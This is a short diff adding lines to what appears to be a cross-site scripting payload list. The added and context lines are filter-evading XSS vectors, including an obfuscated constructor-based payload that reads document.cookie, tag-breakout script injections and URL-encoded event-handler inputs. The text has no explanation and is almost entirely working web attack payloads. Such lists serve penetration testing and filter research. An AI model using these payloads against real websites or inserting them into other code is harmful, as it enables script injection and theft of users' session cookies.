@@ -1,3 +1,6 @@
+<noscript><p title="</noscript><img src=x onerror=([,O,B,J,E,C,,]=[]+{},[T,R,U,E,F,A,L,S,,,N]=[!!O]+!O+B.E)[X=C+O+N+S+T+R+U+C+T+O+R][X](A+L+E+R+T+(document.cookie))()>">
+>>>>>><marquee>RXSS</marquee></head><abc%3E</script><script>alert(document.cookie)</script><meta
+mitsecXSS%22%3E%3Cinput%20%00%20onControl%20hello%20oninput=confirm(1)%20x%3E
 xss=*/prompt("XSS")/*&
 xss"</sc"ript><sv"g/onloa"d=aler"t"(document.doma"in)>
 <XSS STYLE="behavior: url(%(htc)s);">
